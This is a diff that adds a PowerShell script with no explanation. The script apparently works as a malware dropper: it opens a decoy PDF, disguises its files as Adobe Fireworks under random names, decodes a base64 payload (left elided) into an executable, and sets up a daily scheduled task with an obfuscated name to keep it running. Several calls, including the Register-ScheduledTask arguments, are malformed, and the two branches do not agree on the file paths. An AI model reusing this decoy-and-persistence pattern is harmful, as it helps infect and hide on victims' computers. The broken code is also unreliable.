@@ -1,0 +1,42 @@
+# Define variables
+$tmpDirectory = $env:TMP
+$programDataDirectory = $env:ProgramData
+$satPdfFile = $tmpDirectory + '\SAT_2.pdf'
+$jgfasjjfyt73hgsfhy553jdggAffsdDirectory = $programDataDirectory + '\Jgfasjjfyt73hgsfhy553jdggAffsd'
+$randomString = Get-Random -InputObject 'a','b','c','d','e','f','g','h','i','j','k', 'l','m','n' -Count 5
+Start-Sleep -s 5
+$adobeFireworksDirectory = $programDataDirectory + '\Adobe-Fireworks-' + $randomString
+$adobeFireworksRarFile = $adobeFireworksDirectory + '\Adobe-Fireworks-' + $randomString + '.rar'
+$operatingSystem = wmic os get Caption
+$binTmpFile = $tmpDirectory + '\bin.tmp'
+$adobeFireworksExeFile = 'Adobe-Fireworks-' + $randomString + '.exe'
+
+# Check if Jgfasjjfyt73hgsfhy553jdggAffsd directory exists
+if (Test-Path $jgfasjjfyt73hgsfhy553jdggAffsdDirectory) {
+    start $satPdfFile
+    exit
+}
+
+# Check operating system version
+if ($operatingSystem -match '7') {
+    # Windows 7
+    mkdir $adobeFireworksDirectory
+    mkdir $jgfasjjfyt73hgsfhy553jdggAffsdDirectory
+    $taskName = 'IG-Mht BpcBTfGbf'
+    $taskDescription = 'IG-Mht BpcBTfGbf'
+    $taskCommand = $adobeFireworksDirectory + '\' + $adobeFireworksExeFile
+    $taskTrigger = 'At 22:33 every 1 day'
+    Register-ScheduledTask -TaskName $taskName -Description $taskDescription -TaskPath '\' -Command $taskCommand -Trigger $taskTrigger
+}
+else {
+    # Other operating system
+    $base64Data = '...'
+    Set-Content -Path $binTmpFile -Value $base64Data
+    $decodedData = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64Data))
+    Set-Content -Path $adobeFireworksExeFile -Value $decodedData
+    $taskName = 'IG-Mht BpcBTfGbf'
+    $taskDescription = 'IG-Mht BpcBTfGbf'
+    $taskCommand = $programDataDirectory + '\' + $adobeFireworksExeFile
+    $taskTrigger = 'At 22:33 every 1 day'
+    Register-ScheduledTask -TaskName $taskName -Description $taskDescription -TaskPath '\' -Command $taskCommand -Trigger $taskTrigger
+}
